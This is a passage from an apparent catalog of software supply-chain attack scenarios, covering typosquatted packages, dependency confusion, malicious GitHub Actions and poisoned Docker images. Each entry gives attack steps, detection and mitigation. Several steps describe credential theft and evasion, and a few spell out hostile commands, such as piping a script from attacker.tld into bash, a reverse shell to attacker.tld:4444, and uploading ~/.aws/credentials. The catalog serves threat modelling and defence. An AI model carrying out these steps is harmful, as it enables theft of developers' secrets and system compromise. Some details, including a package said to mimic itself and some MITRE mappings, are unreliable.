- **Attack Type**: Malicious Libraries
- **Target**: GitHub CI, CI runners
- **Vulnerability**: Trust in patch-level versioning
- **MITRE**: T1195.002
- **Impact**: Hidden update leads to system compromise
- **Tools**: NPM, GitHub Actions, npq
- **Scenario**: An attacker exploits semantic versioning to introduce malware under the guise of a patch update.
- **Attack Steps**: 1. Attacker submits a PR with legitimate bug fix to data-parser repo and gets it merged (v2.3.0). 2. They later upload v2.3.1 with identical features but embed a payload in index.js. 3. Most projects use ^2.3.0, pulling in 2.3.1 automatically. 4. CI systems fetch the update, and postinstall runs curl to fetch remote script. 5. Script writes a cron job for persistence and leaks .npmrc, .env, and SSH config. 6. Because version bump appears minor, it goes unnoticed. 7. Attacker monitors cron-exfil data and pivots into infrastructure.
- **Detection**: SemVer diff alerts; monitor minor version jumps
- **Solution**: Use exact version locks (~ or pin); monitor recent patch releases
- **Tags**: #semver #versiontrust #ciupdateattack

## Malicious Linter Plugin Infecting Dev Environments

- **Attack Type**: Malicious Libraries
- **Target**: Developer IDEs (VSCode)
- **Vulnerability**: Auto-installed malicious dev tooling
- **MITRE**: T1204.002
- **Impact**: Credential theft, repo exfiltration
- **Tools**: ESLint, VSCode, curl
- **Scenario**: Attacker creates a malicious VSCode linter plugin that executes code on first activation, stealing secrets.
- **Attack Steps**: 1. A fake eslint-plugin-ui-cleaner is published with working lint rules and a hidden dependency token-grabber. 2. token-grabber includes a hidden base64 blob decoded during plugin load. 3. When the plugin activates in VSCode, it scans local browser and Git config folders. 4. It uses HTTPS POST to send GitHub auth tokens, Git email config, and .npmrc auth to the attacker. 5. Everything works normally so no suspicion is raised. 6. The stolen tokens enable attacker to clone private repos. 7. The payload deletes itself after use to minimize traces.
- **Detection**: Watch for plugin downloads from unverified sources
- **Solution**: Allow only company-reviewed plugins; audit new extensions
- **Tags**: #eslint #vscodeplugins #devinfect

## Public Package Masquerading as Internal Scoped Dependency

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD pipelines
- **Vulnerability**: Registry resolution misconfiguration
- **MITRE**: T1195.002
- **Impact**: Exfil of sensitive CI info
- **Tools**: NPM, MITMproxy, .npmrc configs
- **Scenario**: Attacker registers a public package with the same name as a private scoped one, fooling misconfigured CI pipelines.
- **Attack Steps**: 1. Attacker finds repo referring to internal package @corp/devtools on GitHub. 2. Publishes corp-devtools to NPM with similar API and added preinstall shell. 3. CI misconfig has no @corp registry mapping, so NPM defaults to public. 4. Build system fetches attacker’s version. 5. Script runs env, cat ~/.aws/credentials, and uploads results to a webhook. 6. Maintainers are unaware as build still succeeds. 7. Attacker later uses the leaked tokens for internal API abuse.
- **Detection**: Log exact source URLs of installed packages
- **Solution**: Lock internal registry usage; deny public versions of scoped names
- **Tags**: #npm #scopeconfusion #registryfail

## PyPI Namespace Reuse to Infiltrate Abandoned Internal Tools

- **Attack Type**: Malicious Libraries
- **Target**: Internal CI systems
- **Vulnerability**: Namespace collision via package abandonment
- **MITRE**: T1195.002
- **Impact**: Credential theft, environment compromise
- **Tools**: pip, PyPI, setup.py, base64
- **Scenario**: A previously used internal package name is registered by an attacker and reused to deliver backdoored tools.
- **Attack Steps**: 1. Attacker finds old ml-utils Python package in company docs no longer hosted internally. 2. Confirms it’s unclaimed on PyPI and registers it with identical structure and function names. 3. Embeds encrypted payload using base64 in a helper function. 4. A dev re-adds ml-utils in requirements.txt during legacy code revival. 5. CI pulls the new package from PyPI. 6. On import, it decrypts and runs code that uploads ~/.aws/config and GCP keys to remote server. 7. The dev notices nothing since all API calls work fine.
- **Detection**: Alert on re-appearing packages with new authorship
- **Solution**: Auto-reserve used internal names on public registries
- **Tags**: #pypi #namespacehijack #abandonware

## Homoglyph Spoofing in IaC SDK Namespaces

- **Attack Type**: Homoglyph Attack
- **Target**: IaC Pipelines
- **Vulnerability**: Unicode homoglyphs in dependency names
- **MITRE**: T1036
- **Impact**: Cloud credentials leakage
- **Tools**: Terraform, pip, UnicodeTools
- **Scenario**: Attacker uses Unicode lookalikes to spoof SDK names like aws-sdk-core, bypassing typo detection tools.
- **Attack Steps**: 1. Attacker identifies aws-sdk-core used in internal Terraform automation. 2. Publishes аws-sdk-core (first a is Cyrillic) to PyPI. 3. Name looks identical in fonts, fooling devs. 4. Setup script exfiltrates AWS credentials from env vars. 5. A typo in IaC script pulls spoofed version. 6. Pipeline runs and leaks secrets via HTTP. 7. Since the name "looks" right, debugging is delayed.
- **Detection**: Detect Unicode in dependencies via scanners
- **Solution**: Enforce ASCII-only naming and static dependency lists
- **Tags**: #UnicodeAttack #IaC #Homoglyph #Cloud

## Action Hook Injection via Third-Party GitHub CI Step

- **Attack Type**: CI Hook Injection
- **Target**: GitHub CI
- **Vulnerability**: Implicit trust in third-party action code
- **MITRE**: T1059.003
- **Impact**: GitHub token theft via workflow
- **Tools**: GitHub Actions, YAML
- **Scenario**: Attacker adds a malicious step into a GitHub Action referenced as a third-party workflow via uses: directive.
- **Attack Steps**: 1. Attacker uploads a GitHub Action under their account (e.g., attacker/build-step). 2. Modifies it to include secret-dumping in pre hook. 3. Victim project references this Action directly (uses: attacker/build-step@v1). 4. During workflow, malicious hook logs secrets and uploads them. 5. Action otherwise appears to work normally. 6. Stealth attack relies on trust in community actions.
- **Detection**: Audit uses: declarations; monitor outbound connections
- **Solution**: Self-host critical workflows or mirror verified Actions
- **Tags**: #GitHubActions #WorkflowAbuse #CIHooks

## Registry Failover Abuse via Network Throttling

- **Attack Type**: Forced Registry Downgrade
- **Target**: CI/CD pipelines
- **Vulnerability**: Weak fallback logic under network issues
- **MITRE**: T1190
- **Impact**: Credential theft, registry poisoning
- **Tools**: npm, MITMproxy, DNS tools
- **Scenario**: Attacker intentionally slows access to enterprise registry, causing npm to fall back to public registry.
- **Attack Steps**: 1. Attacker MITMs or blocks DNS to private registry during CI build. 2. npm registry fallback behavior causes public fetch. 3. Attacker's fake package with same name (corp-utils) is retrieved. 4. Postinstall scripts exfiltrate CI environment details. 5. Build appears to complete, but secrets are now compromised. 6. This works in environments lacking offline cache or pinning.
- **Detection**: Detect latency-triggered registry fallback
- **Solution**: Require registry cert pinning and checksum validation
- **Tags**: #npm #MITM #RegistryDowngrade #CIThreat

## Side-loaded JavaScript Payload in Dev-only Transitive Package

- **Attack Type**: Side-loading
- **Target**: Dev/Test Environments
- **Vulnerability**: Trust in dev-only dependencies
- **MITRE**: T1070.004
- **Impact**: Silent dev compromise
- **Tools**: Node.js, npm, jest
- **Scenario**: A benign-looking JS utility library includes side-loaded payload that only activates in dev or test environments.
- **Attack Steps**: 1. Attacker publishes debug-formatter with payload in devTools.js. 2. Used as devDependency in popular lib. 3. Final user installs main-framework which pulls it indirectly. 4. Payload activates only when NODE_ENV=development, avoiding prod triggers. 5. It scans local SSH keys and Git config, sends via HTTPS. 6. Evasion via dev-only execution delays detection. 7. Attacker gains persistent dev access.
- **Detection**: Alert on devDeps with net connections
- **Solution**: Restrict devDeps in prod; scan all deps regardless of flag
- **Tags**: #devOnly #npm #SideLoad #EnvScopeAttack

## Clone-and-Poison Attack with Template-based Repo

- **Attack Type**: Poisoned Starter Template
- **Target**: Developer Environments
- **Vulnerability**: Blind trust in pre-made project templates
- **MITRE**: T1204.001
- **Impact**: Credential loss, infected boilerplate
- **Tools**: GitHub, Cookiecutter, pip
- **Scenario**: Attacker creates a repo that looks like a starter project and bakes in malicious dependencies as base.
- **Attack Steps**: 1. Attacker creates flask-starter-template with SEO-friendly README and tags. 2. Template includes requirements.txt with telemetry-client==1.0.0. 3. Package includes malicious postinstall sending browser data and AWS tokens. 4. Devs clone template for rapid prototyping. 5. pip install -r infects environment. 6. No explicit fork or repo weirdness, so looks trusted.
- **Detection**: Flag first-time installs with unknown authors
- **Solution**: Mandate internal templates and dependency audits
- **Tags**: #PoisonedTemplates #GitHub #pip

## Preloaded Malicious Layer via Docker Entrypoint Abuse

- **Attack Type**: Entrypoint Exploit
- **Target**: Docker CI Systems
- **Vulnerability**: Hidden command injection via ENTRYPOINT
- **MITRE**: T1203
- **Impact**: Container-level compromise & persistence
- **Tools**: Docker, DockerHub, bash
- **Scenario**: Attacker builds Docker image with malicious ENTRYPOINT that executes before any app code, using stolen dependency names.
- **Attack Steps**: 1. Attacker publishes corp/builder-node:latest image. 2. Dockerfile includes ENTRYPOINT ["/bin/bash", "-c", "npm i fake-lib && node exploit.js"]. 3. fake-lib mimics internal-only dependency. 4. During CI pipeline build, image is used unknowingly. 5. Entrypoint executes, sending tokens and SSH configs to attacker’s server. 6. Since commands execute before app starts, logs look clean. 7. Developer blames app bugs while attacker is inside.
- **Detection**: Scan entrypoint logic; restrict external base images
- **Solution**: Pin image digests; block unauthorized DockerHub pulls
- **Tags**: #Docker #EntrypointAbuse #ContainerBackdoor

## Compromised Terraform Mirror with Backdoored Binaries

- **Attack Type**: Infrastructure Dependency Injection
- **Target**: DevOps Teams
- **Vulnerability**: Misconfigured provider mirror usage
- **MITRE**: T1203
- **Impact**: Infrastructure takeover
- **Tools**: Terraform CLI, HTTPS Proxy
- **Scenario**: Attacker sets up a fake mirror for Terraform providers that returns backdoored binaries.
- **Attack Steps**: 1. Attacker sets up a public mirror for Terraform providers using open-source hosting tools.2. Copies metadata from the real registry but modifies the response to swap provider URLs with attacker-controlled binaries.3. Victim organization configures Terraform to use a custom provider mirror (e.g., due to firewall policy or latency improvements).4. When terraform init runs, it fetches the tampered binary from the fake mirror.5. Malicious binary opens a reverse shell or steals AWS credentials from env.6. Attacker gains persistent access or lateral movement.
- **Detection**: Monitor traffic to non-official mirrors
- **Solution**: Always verify mirror source and validate binary hash
- **Tags**: #terraform #mirrors #binarybackdoor

## Fake RubyGem Mimics Popular OAuth Library

- **Attack Type**: Malicious Library
- **Target**: Ruby Web Apps
- **Vulnerability**: Typosquatting, token interception
- **MITRE**: T1557.001
- **Impact**: Account takeover
- **Tools**: RubyGems, OAuth2
- **Scenario**: A fake RubyGem mimics a known OAuth helper and captures auth codes during login flows.
- **Attack Steps**: 1. Attacker creates a new RubyGem named oauth2-helperx, mimicking the trusted oauth2-helper.2. In the source code, modifies the redirect handler to log OAuth authorization codes and access tokens.3. Uploads it to RubyGems with convincing documentation and similar keywords.4. A developer unknowingly adds the gem to a Rails app, assuming it’s an updated variant.5. During real-world OAuth flows, the library intercepts auth tokens and sends them to an attacker-controlled webhook.6. Attacker reuses stolen tokens to access user accounts on Google/GitHub.
- **Detection**: Monitor gem source and validate OAuth token flows
- **Solution**: Use exact dependency names, lock Gemfile versions
- **Tags**: #oauth #rubygems #typosquat

## Dockerfile FROM Pulls Shadow Image with CryptoMiner

- **Attack Type**: Container Supply Chain
- **Target**: Containers
- **Vulnerability**: Image name similarity, hidden runtime
- **MITRE**: T1608.006
- **Impact**: Cloud resource abuse
- **Tools**: Docker, Docker Hub
- **Scenario**: A Dockerfile uses an image that mimics a base image but includes a hidden cryptominer.
- **Attack Steps**: 1. Attacker creates a malicious image named node-slim-secure:14 and uploads it to Docker Hub.2. This image closely resembles the real node:14-slim but contains a background process that launches xmrig (CPU miner) silently.3. Dev team uses this image in their Dockerfile due to its naming (assumes it's a secure variant).4. Upon container build and run, the miner initiates, consuming CPU silently.5. The miner process connects to a Monero mining pool via Tor or proxy.6. Organization experiences performance issues and cloud resource cost spikes.
- **Detection**: Monitor container CPU/memory spikes and base image hash
- **Solution**: Pin base images and scan all layers in CI/CD pipeline
- **Tags**: #docker #cryptojacking #container

## Obfuscated Preinstall Script Steals GitHub Tokens

- **Attack Type**: Malicious Library
- **Target**: Developer Machines
- **Vulnerability**: GitHub token stored in plaintext
- **MITRE**: T1557.003
- **Impact**: Source code theft, repo hijack
- **Tools**: NPM, Node.js, GitHub
- **Scenario**: A package uses an obfuscated preinstall script to extract and exfil GitHub tokens.
- **Attack Steps**: 1. Attacker publishes a package named theme-configurator on NPM with a valid-looking README.2. The package.json includes a preinstall script that runs an obfuscated Node script.3. This script searches for .git-credentials, .npmrc, and common ~/.env files containing GitHub PATs.4. Extracted tokens are base64-encoded and sent over HTTPS to the attacker.5. Attacker uses the PAT to clone private GitHub repos, inject more malware, or pivot deeper.6. Tokens allow attacker to impersonate users or push poisoned code to production repos.
- **Detection**: Monitor preinstall activity and outbound DNS/HTTPS
- **Solution**: Disable lifecycle scripts by default, review all package.json
- **Tags**: #npm #githubtoken #preinstall

## Signed Terraform Provider with Delayed Payload

- **Attack Type**: Infrastructure Dependency Injection
- **Target**: DevOps Teams
- **Vulnerability**: Time-delayed binary payloads
- **MITRE**: T1203
- **Impact**: Covert credential theft
- **Tools**: Terraform, GPG
- **Scenario**: Attacker publishes a signed Terraform provider that activates malicious payload after delay.
- **Attack Steps**: 1. Attacker forks an old Terraform provider and adds an encrypted payload that remains dormant until triggered.2. Uses a valid GPG signature to publish the provider to an unofficial registry.3. The binary checks system metadata and delays execution for 7 days to bypass testing/sandbox.4. After 7 days, payload decrypts itself using hardcoded key and exfiltrates AWS creds.5. Dev teams using source = "mirror/aws-deploy" install the malicious binary.6. Security teams miss initial indicators due to time-based evasion.7. Attacker uses creds to access AWS infra and pivot laterally.
- **Detection**: Hash and scan providers at CI and runtime
- **Solution**: Stick to official registries, enable behavioral alerting
- **Tags**: #terraform #binaryevasion #cloud

## NPM Dependency Confusion via Proxy Misconfiguration

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD pipelines
- **Vulnerability**: Misconfigured registry fallback
- **MITRE**: T1195.002
- **Impact**: Credential theft & code execution
- **Tools**: npm, NPM registry
- **Scenario**: An attacker exploits a misconfigured .npmrc file where the internal registry is not enforced, allowing a malicious public package to override the internal one.
- **Attack Steps**: 1. Attacker looks for .npmrc misconfigurations in public repos or build logs—specifically missing always-auth or fallback to the public registry. 2. Identifies an internal package named @corp-utils/auth-wrapper used by the organization. 3. Publishes @corp-utils/auth-wrapper to the public NPM registry with a version like 100.0.0, ensuring it outranks internal versions. 4. A CI pipeline with a misconfigured .npmrc installs the public version because it falls back to the public registry when internal resolution fails or timeout occurs. 5. The malicious package contains a postinstall script that uses child_process.exec to exfiltrate environment variables via DNS tunneling. 6. Secrets like tokens or credentials are sent to attacker-controlled domains during the build phase.
- **Detection**: Analyze .npmrc files in codebases; detect DNS requests to suspicious domains
- **Solution**: Enforce strict internal registry, lock dependency versions, block public fallbacks
- **Tags**: #npm #devops #registrymisconfig

## Malicious PyPI Package via Reverse Shell in setup.py

- **Attack Type**: Malicious Library
- **Target**: Developer machines
- **Vulnerability**: Typosquatting, unsanitized setup script execution
- **MITRE**: T1059.006
- **Impact**: Remote shell access to developer host
- **Tools**: PyPI, setup.py, base64
- **Scenario**: A malicious Python package mimics a real one and includes a reverse shell payload in the setup script, giving the attacker access to the victim’s machine.
- **Attack Steps**: 1. Attacker creates a lookalike package called httplib3, mimicking the real httplib3. 2. In setup.py, inserts an obfuscated base64 payload that decodes into a Python one-liner reverse shell (e.g., to attacker.tld:4444). 3. The payload runs automatically on pip install, establishing a reverse connection to the attacker's server. 4. A developer or data scientist installs the wrong package while prototyping (e.g., pip install httplib3). 5. Upon installation, the attacker gets shell access to the developer’s machine. 6. From here, lateral movement, credential harvesting, or data exfiltration is possible.
- **Detection**: Monitor for unexpected outbound traffic during pip install
- **Solution**: Use dependency pinning, scan PyPI packages before install
- **Tags**: #pypi #reverse_shell #typosquatting

## GitHub Action Abuse via Self-Hosted Runner Exploit

- **Attack Type**: CI/CD Injection
- **Target**: GitHub CI pipelines
- **Vulnerability**: Unverified actions + self-hosted runner privileges
- **MITRE**: T1056.001
- **Impact**: Persistence, resource theft, or lateral movement
- **Tools**: GitHub Actions, YAML, Bash
- **Scenario**: Attacker crafts a GitHub Action that abuses lax permissions of a self-hosted runner to escalate privileges or install malware.
- **Attack Steps**: 1. Attacker creates a GitHub Action called setup-python-plus and publishes it to a public repo with seemingly legitimate metadata. 2. Inside the Action script, it performs a curl to attacker.tld/setup.sh and silently runs the script using bash. 3. The script checks if the runner is self-hosted (e.g., via environment variables or hostname checks). 4. If it is, the script downloads additional payloads like crypto miners or secret scrapers, installing them silently. 5. A maintainer of a private GitHub repo unknowingly includes this Action in their CI workflow thinking it's official. 6. During workflow execution, the malicious script runs with the elevated host privileges available to the self-hosted runner, infecting the host.
- **Detection**: Monitor for unauthorized downloads in CI workflows
- **Solution**: Use verified Actions only, limit self-hosted runner privileges
- **Tags**: #github #ciabuse #selfhosted

## Dependency Confusion via Misconfigured .npmrc

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD pipelines, build servers
- **Vulnerability**: Misconfigured .npmrc fallback behavior
- **MITRE**: T1195.002
- **Impact**: Remote access into CI via malicious package
- **Tools**: npm, public NPM registry
- **Scenario**: A CI pipeline uses a misconfigured .npmrc file that doesn't prioritize the internal registry, allowing public packages with the same name to be installed.
- **Attack Steps**: 1. Attacker discovers that the organization uses a private scope, such as @corp-lib/analytics, from public GitHub commits containing package.json or .npmrc files. 2. Observes that .npmrc is misconfigured to fall back on the public registry when the private one fails. 3. Attacker publishes @corp-lib/analytics to the public npm registry with version 100.0.0, tricking semver. 4. During CI builds, due to fallback behavior and higher version number, the malicious public package is downloaded. 5. The attacker embeds a malicious postinstall script in the package that executes a shell command to download and execute a reverse shell. 6. Once installed in CI, the script gives remote access to the attacker, allowing pivot into internal networks.
- **Detection**: Monitor public/private package resolution, analyze installed package sources
- **Solution**: Enforce strict .npmrc configs, disable public fallback, use lockfiles
- **Tags**: #npm #ci #dependencyconfusion

## Typosquatting PyPI Package with Reverse Shell

- **Attack Type**: Malicious Library
- **Target**: Developer systems, laptops
- **Vulnerability**: Typo-based package impersonation
- **MITRE**: T1059.006
- **Impact**: Full control over dev environment
- **Tools**: PyPI, base64, Python reverse shell
- **Scenario**: A malicious PyPI package mimics a common library with a typo in its name. The payload triggers a reverse shell on the developer machine upon installation.
- **Attack Steps**: 1. Attacker searches for popular PyPI packages like matplotlib, numpy, and creates typo versions like matplotllib. 2. Inside the setup.py, attacker embeds a base64-encoded reverse shell that triggers during install. 3. The package is uploaded to PyPI with realistic metadata and download stats (automated with scripts). 4. A developer mistypes pip install matplotllib, unknowingly installing the attacker's package. 5. The setup.py payload executes on install, decoding the base64 payload and initiating a reverse shell connection to the attacker's server. 6. The attacker now has terminal access to the victim's machine and can exfiltrate SSH keys, code, or credentials.
- **Detection**: Network behavior, unexpected outbound traffic, PyPI audit tools
- **Solution**: Always verify spelling, use pip hash and allowlisting
- **Tags**: #pypi #typosquatting #reverse_shell

## Fake GitHub Action with Token Stealer Script

- **Attack Type**: CI/CD Injection
- **Target**: GitHub CI runners
- **Vulnerability**: Blind trust in unverified Actions
- **MITRE**: T1552.001
- **Impact**: Secret token theft from CI
- **Tools**: GitHub Actions, curl, webhook.site
- **Scenario**: An attacker creates a GitHub Action that appears legitimate but steals GitHub tokens from the CI runner and sends them to an attacker-controlled domain.
- **Attack Steps**: 1. Attacker creates a GitHub Action named setup-nodejs-env with similar naming and metadata as the legitimate actions/setup-node. 2. In the action's workflow file (action.yml), a hidden run step is included to curl sensitive environment variables (GITHUB_TOKEN, AWS_SECRET, etc.) to a webhook like webhook.site. 3. The attacker publishes the action in a public GitHub repo, marks it as “v1.0”, and adds realistic README docs to appear official. 4. A victim repo unknowingly references this malicious Action during CI setup. 5. When a PR is merged and CI runs, the action is triggered, silently sending secrets to the attacker's webhook. 6. The attacker uses these secrets to clone private repos, push malicious code, or pivot into cloud environments.
- **Detection**: Analyze CI logs for unknown web requests, repo audits
- **Solution**: Use verified Actions only, restrict secret env var exposure
- **Tags**: #githubactions #secretleak #tokenstealing

## Dependency Confusion Using .package-lock.json Leak

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD build environments
- **Vulnerability**: Leaked package lockfiles revealing private package names
- **MITRE**: T1195.002
- **Impact**: Code execution during CI builds
- **Tools**: npm, GitHub, netcat
- **Scenario**: An attacker finds a leaked .package-lock.json file in a public GitHub repo, extracts internal package names, and exploits build systems by publishing malicious versions of those packages.
- **Attack Steps**: 1. Attacker searches GitHub for .package-lock.json files using in:path package-lock.json org:target-org. 2. Extracts scoped internal package names like @target/payment-core. 3. Checks NPM to verify the package doesn’t exist on the public registry. 4. Publishes a malicious version @target/payment-core@88.88.8 with a payload that runs on postinstall. 5. The payload triggers a reverse shell or token exfiltration when the build system pulls in the public version due to semver logic. 6. The attacker gains access to build environments and potentially sensitive credentials from .env or AWS variables.
- **Detection**: Monitor access to internal packages, check for new packages in public registry
- **Solution**: Prevent lockfile leaks, enforce internal registry scoping and access controls
- **Tags**: #npm #packageleak #reverse_shell

## Malicious Python Package with Idle-Time Data Theft

- **Attack Type**: Malicious Library
- **Target**: Developer endpoints
- **Vulnerability**: Low-visibility delayed execution payload
- **MITRE**: T1020
- **Impact**: Data exfiltration from dev machine
- **Tools**: PyPI, psutil, requests
- **Scenario**: A PyPI package executes a low-profile data exfiltration script that only activates after a system idle period to evade detection.
- **Attack Steps**: 1. Attacker uploads a malicious PyPI package with a name similar to an internal tool like corp-cli-helper. 2. The setup.py installs the package and includes a post-install step that drops a Python script into the OS’s autostart location. 3. This script uses psutil to detect idle time (no mouse or keyboard input for X minutes). 4. Once idle, the script begins scanning ~/.aws, .ssh, and other sensitive directories. 5. It compresses the data and sends it to the attacker’s server over HTTPS. 6. Because the payload runs only during inactivity, defenders relying on real-time alerts may miss it.
- **Detection**: Check autostart folder, monitor outbound HTTPS during idle
- **Solution**: Endpoint behavior monitoring, trusted indexes, script analysis
- **Tags**: #pypi #idletime #dataexfil

## DevOps Leak Enables Package Shadowing Attack

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Systems
- **Vulnerability**: Private name leakage + semver abuse
- **MITRE**: T1195.002
- **Impact**: Secret exfiltration, CI compromise
- **Tools**: npm, GitHub Actions, curl
- **Scenario**: An attacker leverages internal npm package names exposed in CI logs to shadow them publicly and inject malicious payloads.
- **Attack Steps**: 1. Attacker scrapes public GitHub CI logs using keywords like npm install or @org/. 2. Finds a reference to a package such as @org-lib/config-core, which doesn’t exist on public npm. 3. Publishes a public package with that exact name but a much higher version like 999.0.0. 4. Injects a malicious postinstall script that extracts tokens or uploads files. 5. Developer CI/CD pipeline installs it due to default fallback to public registry. 6. The script executes in build environment, exfiltrating credentials or SSH keys.
- **Detection**: Monitor install logs, detect non-approved package sources
- **Solution**: Use scoped registries only, lock dependencies with exact versions
- **Tags**: npm, devops, github, ci, package hijack

## PyPI Typo Attack on Deep Learning Package

- **Attack Type**: Malicious Libraries
- **Target**: Data Science Workstations
- **Vulnerability**: Human error + PyPI trust
- **MITRE**: T1556.001
- **Impact**: Credential theft, session replay
- **Tools**: PyPI, pip, Python, base64
- **Scenario**: A typo-based PyPI package pretends to be a popular AI tool and installs a keylogger on data science machines.
- **Attack Steps**: 1. Attacker finds high-traffic AI packages like keras, transformers, etc. 2. Registers typo variants like transformrs or keraas. 3. Adds a base64-encoded Python script in setup.py to launch a background process logging keystrokes. 4. Uploads to PyPI and boosts fake stars/readme to improve visibility. 5. A careless user or script installs the typo version. 6. Keylogger runs in the background and sends data to an attacker domain via POST requests.
- **Detection**: Alert on new packages with similar names, monitor DNS exfil
- **Solution**: Pre-install static code audit, endpoint protection
- **Tags**: pypi, typosquatting, ai, base64, keylogger

## Maintainer Account Hijack for Stealth Beacon Implant

- **Attack Type**: Malicious Libraries
- **Target**: Web Apps
- **Vulnerability**: Weak maintainer security
- **MITRE**: T1606.001
- **Impact**: Beacon tracking, client telemetry leakage
- **Tools**: npm, GitHub, Wireshark
- **Scenario**: A trusted maintainer’s npm account is hijacked and a beacon is embedded in a patch version of a widely-used lib.
- **Attack Steps**: 1. Attacker targets maintainer credentials using phishing or leaked tokens. 2. After takeover, publishes version 1.3.1 of web-fetch-api. 3. Adds a line in a utility function to make a silent DNS request to a unique subdomain per install. 4. This beacon allows the attacker to map all clients using the package. 5. Because the change is subtle, developers update without noticing. 6. Attacker gathers intelligence on internal infrastructure from DNS logs.
- **Detection**: Monitor unusual DNS patterns, diff patch releases
- **Solution**: Require 2FA, use package diff alerts
- **Tags**: npm, phishing, telemetry, beacon, dns

## .NET Internal Namespace Abuse via CI Script Leak

- **Attack Type**: Dependency Confusion
- **Target**: .NET CI Pipelines
- **Vulnerability**: Lack of strict source mapping
- **MITRE**: T1195.002
- **Impact**: Remote code execution during builds
- **Tools**: NuGet, GitHub, ILSpy
- **Scenario**: A leaked .csproj in a public repo reveals an internal namespace. The attacker injects a matching public NuGet package.
- **Attack Steps**: 1. Attacker searches GitHub for leaked .csproj or .sln files. 2. Finds namespace Contoso.Sec.Core.Logger used in references. 3. Verifies that no such package exists on NuGet.org. 4. Publishes Contoso.Sec.Core.Logger with a constructor in Logger.cs that executes remote code on instantiation. 5. Developer CI misconfigurations lead to downloading the public version. 6. The malicious class executes when tests run, leaking environment variables.
- **Detection**: Inspect NuGet sources in builds, audit traffic
- **Solution**: Lock to trusted registries, monitor for rogue packages
- **Tags**: nuget, dotnet, namespace, dependency-confusion

## Rust Build Script Triggering Silent System Call

- **Attack Type**: Malicious Libraries
- **Target**: Rust Dev Machines
- **Vulnerability**: Build.rs abuse + implicit trust
- **MITRE**: T1059.004
- **Impact**: Environment profiling, low-noise exfiltration
- **Tools**: crates.io, Cargo, Wireshark
- **Scenario**: A Rust crate embeds a silent system call in build.rs to collect system info and transmit to an attacker server.
- **Attack Steps**: 1. Attacker publishes dataframe-tools crate with fake benchmarks and docs. 2. In build.rs, includes logic to run uname, whoami, and list home directory. 3. Collects output and sends via a silent HTTP POST in the build phase. 4. Since this runs during cargo build, it doesn't appear in runtime behavior. 5. Devs include the crate in microservices for benchmarking. 6. Attacker gets insight into dev environments, usernames, and machines.
- **Detection**: Monitor unusual build.rs actions, outbound HTTP
- **Solution**: Run cargo audit, restrict builds to reviewed crates
- **Tags**: rust, crate, build.rs, infoleak, telemetry

## Delayed Payload in Trusted Package Update

- **Attack Type**: Malicious Library
- **Target**: Dev environments
- **Vulnerability**: Implicit trust in version updates
- **MITRE**: T1554, T1546.003
- **Impact**: Credential theft, CI compromise
- **Tools**: npm, pip
- **Scenario**: A clean package is initially published and gains trust. Later, a malicious update is released quietly.
- **Attack Steps**: 1. The attacker publishes a genuinely useful open-source package, e.g., util-enhancer, to a public registry like npm. 2. The code is clean, performs helpful tasks, and builds credibility by gathering stars and downloads.3. Developers and CI/CD pipelines begin using it, often allowing updates via version ranges like ^1.0.0.4. After a few weeks, the attacker silently updates to version 1.0.1, introducing obfuscated malicious code.5. The malicious code may read system info or tokens and exfiltrate via DNS or HTTP.6. Since the update appears minor, it's pulled automatically into many systems.7. The attacker gains broad access across projects using the trusted package.
- **Detection**: Traffic analysis, checksum diffing
- **Solution**: Pin dependency versions, monitor package updates
- **Tags**: #TrustedPackage #MaliciousUpdate #VersionHijack

## Typosquatting a Scoped Internal Package

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD pipelines
- **Vulnerability**: Registry fallback logic
- **MITRE**: T1195.002
- **Impact**: Initial access via poisoned package
- **Tools**: npm
- **Scenario**: A public package mimics a scoped internal library name, tricking CI systems into installing the fake one.
- **Attack Steps**: 1. The attacker identifies an internal package used by an organization, such as @org/data-utils.2. They publish a public package with the unscoped name data-utils.3. In environments where the internal registry is misconfigured or unavailable, fallback may occur to the public registry.4. The malicious package has mostly functional logic but includes hidden harmful behavior (e.g., beaconing to external C2).5. During a CI build or dev setup, the public package gets installed.6. On execution, the hidden payload runs, possibly harvesting tokens, SSH keys, or environment data.7. Since the name is familiar, detection may take time.
- **Detection**: Compare registry sources, enable strict scoping
- **Solution**: Enforce private registry scoping, lock package sources
- **Tags**: #Typosquatting #ScopedLeak #CITrickery

## Malicious Postinstall Hook in New Library

- **Attack Type**: Malicious Library
- **Target**: Developer machines
- **Vulnerability**: Overlooked install lifecycle behavior
- **MITRE**: T1546.015
- **Impact**: Code execution during dependency install
- **Tools**: npm, yarn
- **Scenario**: A new library gains traction, but contains a malicious script inside the postinstall lifecycle hook.
- **Attack Steps**: 1. An attacker creates a new JavaScript utility library and publishes it on npm, e.g., simple-log-enhancer.2. The package looks harmless and helpful; it improves logging formats and is adopted by smaller projects.3. However, it contains a postinstall hook in the package.json.4. This hook runs a script during installation which silently downloads and executes a remote file.5. The remote script can open reverse shells, modify env variables, or fetch next-stage payloads.6. Since postinstall scripts are commonly used, the malicious behavior is overlooked.7. Many users are compromised upon installation before any usage happens.
- **Detection**: Monitoring install scripts, auditing package metadata
- **Solution**: Disable lifecycle scripts, scan for postinstall in new deps
- **Tags**: #PostInstallAbuse #NPMHook #StealthInstall

## Abusing Optional Dependency Installation

- **Attack Type**: Malicious Library
- **Target**: Developer systems
- **Vulnerability**: Selective execution via platform hooks
- **MITRE**: T1036.005
- **Impact**: Stealthy targeting of specific OS users
- **Tools**: npm
- **Scenario**: An attacker uses optional dependencies to hide and execute payloads only in specific environments.
- **Attack Steps**: 1. A malicious package is published that includes an optional dependency, e.g., win32-helper.2. The optional dependency contains the actual payload and only installs on Windows platforms.3. Linux-based scans or sandboxes do not detect the issue because the optional dependency is skipped.4. On Windows CI or developer machines, the dependency gets installed and executes a malicious script.5. This script may steal browser cookies or install persistence mechanisms.6. Because of selective execution, detection is delayed.7. The attacker targets specific platforms while evading general scanning pipelines.
- **Detection**: Check optionalDependencies in package.json
- **Solution**: Run sandbox tests across OS variants
- **Tags**: #OptionalDep #PlatformTargeting #SelectivePayload

## Dependency Chain Hijack via Nested Module

- **Attack Type**: Malicious Library
- **Target**: Nested dependencies
- **Vulnerability**: Deep dependency tree blind spots
- **MITRE**: T1195.002
- **Impact**: Broad but stealthy compromise
- **Tools**: npm, pip
- **Scenario**: A malicious actor hijacks a low-level dependency deep in a package tree to inject a payload.
